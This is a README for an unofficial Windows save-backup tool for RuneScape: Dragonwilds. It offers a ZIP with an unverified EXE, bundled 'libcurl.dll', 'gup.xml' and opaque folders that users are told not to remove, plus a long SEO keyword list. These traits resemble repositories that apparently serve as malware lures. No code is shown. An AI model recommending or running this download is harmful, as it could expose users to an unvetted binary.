# Dragonwilds Save Backup Manager — RuneScape: Dragonwilds Windows Companion

> **Draft release package — functionality not independently verified.** Unofficial community project; not affiliated with, endorsed, or supported by Jagex.

<p align="center">
  <img src="https://i.postimg.cc/6p216KDT/banner.png" alt="Project Banner" width="100%">
</p>

**Dragonwilds Save Backup Manager** is a proposed desktop companion for RuneScape: Dragonwilds. The intended use case is to **back up and restore local Dragonwilds save files**. This repository currently contains the user-provided application archive; the intended function and version compatibility have not been independently tested.

![Platform](https://img.shields.io/badge/platform-Windows-0078D4) ![Status](https://img.shields.io/badge/status-draft-orange) ![Docs](https://img.shields.io/badge/docs-MIT-blue) ![Game](https://img.shields.io/badge/game-Dragonwilds-23633b)

## DOWNLOAD

**Release asset:** `DragonwildsSaveBackupManager.zip`  
**Executable name in the ZIP:** `DragonwildsSaveBackupManager.exe`  
[Download latest release ZIP](../../releases/latest/download/DragonwildsSaveBackupManager.zip)

When a GitHub Release is published with this exact asset filename, the link above will point to it. `RELEASE/DragonwildsSaveBackupManager.zip` is the local upload-ready package, not an already published GitHub Release.

## What This Does

Intended workflow: Save and restore local world data, with safe copy-before-restore workflows. Please verify these capabilities against the supplied build before making public feature claims.

## Features

**Planned / awaiting verification:**

- Dedicated workflow focused on save backup for Dragonwilds players.
- Windows desktop packaging with a named executable and release archive.
- Organized instructions for installation, safe usage, and troubleshooting.
- Independent community documentation for a single specific task.

## Installation

1. Download the ZIP from the latest GitHub Release after publication.
2. Inspect the ZIP and verify the publisher, file hashes and scan results.
3. Extract the whole ZIP to a trusted location. **Do not remove the included `scr/`, `git/`, `libcurl.dll` or `gup.xml` from the supplied package.**
4. Run `DragonwildsSaveBackupManager.exe` only after its behavior and provenance have been verified.
5. Keep backups of all affected local save and configuration files.

## How It Works

The archive includes a Windows EXE and supporting materials provided by the project owner. Only the EXE filename has been adjusted to this repository's naming convention; no program logic was modified by this packaging step. Verify the intended workflow and update this section with screenshots and reproducible steps before publication.

## FAQ

**Is this an official Jagex application?** No. It is an independent community project.

**Does this include the Dragonwilds game?** No. You must obtain the game from an authorized store.

**Is the software fully tested?** Not by this packaging process. Verification is pending.

**Why is the download link not yet active?** GitHub will resolve it after a Release containing `DragonwildsSaveBackupManager.zip` is published.

**Can I use the tool online or with hosted worlds?** Check current Jagex rules and test specific functions before using any program that modifies game or server state.

## Troubleshooting

- **ZIP link returns 404:** publish a Release with the asset named `DragonwildsSaveBackupManager.zip`.
- **Windows shows an unknown publisher:** verify the source and signatures instead of blindly bypassing security protections.
- **Program does not launch:** check Windows compatibility and preserve every supporting file from the original ZIP.
- **Game files or saves are affected:** restore from backup and stop using the tool until behavior is understood.

## License

The original README text and original repository metadata can be distributed under the **MIT License**. This statement **does not automatically license the bundled EXE, libraries, game assets or third-party source**. Their redistribution rights and licenses require independent confirmation. This repo is not affiliated with Jagex.

## SEO Keywords

RuneScape Dragonwilds save backup, Dragonwilds save backup for Windows, RuneScape Dragonwilds save backup download, Dragonwilds save backup desktop, free Dragonwilds save backup, offline Dragonwilds save backup, Dragonwilds Windows companion tool, Dragonwilds utility for PC, Dragonwilds fan-made save backup, Dragonwilds save backup GitHub, Dragonwilds save backup Windows 11, Dragonwilds save backup Windows 10, Dragonwilds save backup setup guide, Dragonwilds save backup FAQ, Dragonwilds save backup troubleshooting, Dragonwilds save backup beginner guide, Dragonwilds save backup workflow, Dragonwilds save backup companion app, Dragonwilds save backup tool, Dragonwilds save backup manager, RuneScape Dragonwilds PC tools, RuneScape Dragonwilds Windows utility, RuneScape Dragonwilds fan project, RuneScape Dragonwilds companion, Dragonwilds desktop helper, Dragonwilds gaming tools, Dragonwilds survival RPG tools, Dragonwilds player utility, Dragonwilds community resource, Dragonwilds third-party app, Dragonwilds planning tools, Dragonwilds reference utility, Dragonwilds file download, Dragonwilds ZIP package, Dragonwilds portable Windows tool, Dragonwilds release download, Dragonwilds game companion, RuneScape Dragonwilds desktop download, Dragonwilds Windows release, Dragonwilds save backup reference

## GitHub Topics

`dragonwilds-save-backup`, `dragonwilds-save-manager`, `game-save-backup`, `game-save-restore`, `world-backup`, `save-files`, `backup-manager`, `windows-game-tools`, `pc-gaming`, `dragonwilds`, `runescape-dragonwilds`, `data-protection`, `save-backups`, `gaming-utilities`

## Publishing Checklist

- [ ] Verify this binary actually performs the intended workflow.
- [ ] Confirm redistribution rights for EXE, DLL, and all folders.
- [ ] Inspect dependencies and scan release assets.
- [ ] Generate and add a unique `banner.png`; replace `BANNER_URL_HERE` with a working URL.
- [ ] Test the Release download link in the published GitHub repository.
- [ ] Ensure the project follows [Jagex community modding guidance](https://legal.jagex.com/docs/policies/runescape-dragonwilds-community-modding-guidelines).
